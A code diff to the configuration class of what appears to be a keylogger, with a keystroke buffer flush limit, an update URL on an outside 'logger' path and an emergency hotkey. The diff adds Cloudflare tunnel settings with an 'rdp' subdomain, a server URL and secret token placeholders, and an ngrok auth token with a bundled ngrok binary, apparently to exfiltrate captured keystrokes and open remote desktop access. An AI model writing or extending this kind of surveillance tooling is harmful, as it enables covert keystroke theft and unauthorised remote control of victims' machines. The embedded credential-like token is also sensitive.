@@ -18,6 +18,18 @@ class Config:
     BUFFER_LIMIT = 100000  # max keystrokes before flush
     CLIENT_VERSION = "1.0"
     UPDATE_URL = "https://fasitheme.ir/logger/version.php"
+
+    CLOUDFLARE_TUNNEL_TOKEN = "your_cloudflare_tunnel_token"
+    CLOUDFLARE_BINARY = "cloudflared.exe"
+    CLOUDFLARE_SUBDOMAIN = "rdp" 
+    CLOUDFLARE_DOMAIN = "example.com" 
+    SECRET_TOKEN = "your_secret_token"
+    SERVER_URL = "https://your_server_url"
+    DEBUG_MODE = True
+
+    NGROK_AUTH_TOKEN = "2xg9jXmy291m3pWFGJ8xWNZGT4Q_3AYBu18nyLppQxTRvw35K"  # Replace with your ngrok auth token
+    NGROK_BINARY = "ngrok.exe"  # Name of the ngrok binary included in the build
+
     
     # System Settings
     EMERGENCY_HOTKEY = "ctrl+alt+shift+k"
